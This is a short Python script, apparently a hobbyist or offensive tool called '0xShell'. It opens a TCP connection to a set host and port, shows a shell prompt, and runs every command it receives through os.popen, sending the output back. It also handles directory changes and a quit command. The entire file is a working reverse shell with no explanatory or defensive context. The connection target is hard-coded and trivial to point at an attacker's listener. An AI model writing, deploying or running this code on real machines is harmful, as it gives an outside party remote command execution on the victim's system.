import os,socket
host = "127.0.0.1"
port = 444
data = 512
s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
#print s.recv(512)
s.send('''
      <=========================>
             #{+}0xShell#
      <=========================>\nshell:~$''')
while 1:
    data = s.recv(512)
    if "q" == data.lower():
        s.close()
        break;
    else:
        if data.startswith('cd'):
           os.chdir(data[3:].replace('\n',''))
           s.send("-> "+str(os.getcwd()))
           result='\n'
        else:
           result=os.popen(data).read()
    if (data.lower() != "q"):
            s.send(str(result)+"shell:~$")
    else:
        s.send(str(result))
        s.close()
        break;
exit()
